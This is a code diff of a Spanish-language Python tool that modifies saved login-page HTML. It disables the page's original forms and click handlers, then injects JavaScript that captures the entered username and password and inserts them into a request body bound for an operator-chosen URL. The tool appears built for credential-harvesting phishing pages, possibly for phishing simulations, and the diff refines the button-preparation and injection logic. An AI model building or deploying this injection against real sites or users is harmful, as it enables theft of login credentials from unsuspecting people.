@@ -41,7 +41,7 @@ def create_form(carpeta, fichero_html):
     sel_user = Prompt.ask("Introduce el selector CSS del campo de usuario (ej: input[name='email'])")
     sel_pass = Prompt.ask("Introduce el selector CSS del campo de contraseña")
     sel_boton = Prompt.ask("Introduce el selector CSS del botón que enviará la petición")
-    soup,sel_boton = clear_format(soup,sel_boton)
+    
 
     # Dirección de destino
     url_destino = Prompt.ask("Introduce la URL de destino a la que se enviará la petición (ej: https://midominio.com/login)")
@@ -68,6 +68,9 @@ def create_form(carpeta, fichero_html):
         url_final = url_destino
         body_final = body_template
 
+    soup,sel_boton = clear_format(soup,sel_boton)
+    print(f"EL BOTON DESPUES DE LIMPIAR EN LA FUNCION INICIAL {sel_boton}")
+    
     with open(ruta, "w", encoding="utf-8") as f:
         f.write(str(soup.prettify()))
 
@@ -131,10 +134,10 @@ document.querySelector("{sel_boton}").addEventListener("click", function(e) {{
         escaped_body = body_template.replace('"', '\\"').replace("\n", "\\n")
 
         script_content = f"""
-document.querySelector("{sel_boton}").addEventListener("click", function(e) {{
+document.querySelector(`{sel_boton}`).addEventListener("click", function(e) {{
     e.preventDefault();
-    const username = document.querySelector("{sel_user}").value;
-    const password = document.querySelector("{sel_pass}").value;
+    const username = document.querySelector(`{sel_user}`).value;
+    const password = document.querySelector(`{sel_pass}`).value;
     const rawBody = `{body_template}`;
     const finalBody = rawBody
         .replace(/<%username%>/g, username)
@@ -171,42 +174,38 @@ document.querySelector("{sel_boton}").addEventListener("click", function(e) {{
     console.print(f"[bold green]✅ Script inyectado correctamente en:[/] {ruta}")
 
 def clear_format(soup, sel_boton):
-    # Eliminar comportamiento de formularios
+    # 1) Desactivar formularios
     for form in soup.find_all("form"):
         form.attrs.pop("action", None)
         form.attrs.pop("onsubmit", None)
         form["onsubmit"] = "return false;"
 
-    # Convertir todos los input submit a button
-    for inp in soup.find_all("input"):
-        if inp.get("type", "").lower() == "submit":
-            inp["type"] = "button"
+    # 2) Localizar el botón DENTRO del HTML original
+    orig = soup.select_one(sel_boton)
+    if not orig:
+        console.print(f"[red]❌ No existe ningún elemento que coincida con '{sel_boton}'[/]")
+        return soup, sel_boton
 
-    # Convertir todos los button submit a button normal
-    for btn in soup.find_all("button"):
-        if btn.get("type", "").lower() == "submit":
-            btn["type"] = "button"
-        btn.attrs.pop("onclick", None)
+    # 3) Convertir globals: todos los input submit → button
+    for inp in soup.select('input[type="submit"]'):
+        inp["type"] = "button"
+    #    y todos los <button type="submit">
+    for btn in soup.select('button[type="submit"]'):
+        btn["type"] = "button"
+    # 4) Quitar onclick de *todos* para evitar lógica previa
+    for tag in soup.find_all():
+        tag.attrs.pop("onclick", None)
 
-    # Localizar el botón original y asegurarse de que tiene un id
-    nuevo_selector = sel_boton  # valor por defecto
-    try:
-        boton = soup.select_one(sel_boton)
-        if boton:
-            boton.attrs.pop("onclick", None)
-            boton["type"] = "button"
-            if not boton.has_attr("id"):
-                # Generar id único
-                generated_id = "inject-btn"
-                count = 1
-                while soup.find(id=generated_id):
-                    generated_id = f"inject-btn-{count}"
-                    count += 1
-                boton["id"] = generated_id
-                nuevo_selector = f"#{generated_id}"
-            else:
-                nuevo_selector = f"#{boton['id']}"
-    except Exception as e:
-        console.print(f"[yellow]⚠️ No se pudo limpiar el botón '{sel_boton}': {e}[/]")
+    # 5) Asegurarte de que tu target tiene un id
+    if not orig.has_attr("id"):
+        base = "inject-btn"
+        cnt = 1
+        new_id = base
+        while soup.find(id=new_id):
+            cnt += 1
+            new_id = f"{base}-{cnt}"
+        orig["id"] = new_id
+    new_selector = f"#{orig['id']}"
 
-    return soup, nuevo_selector
+    console.print(f"[green]✅ Botón preparado con id → selector final:[/] {new_selector}")
+    return soup, new_selector
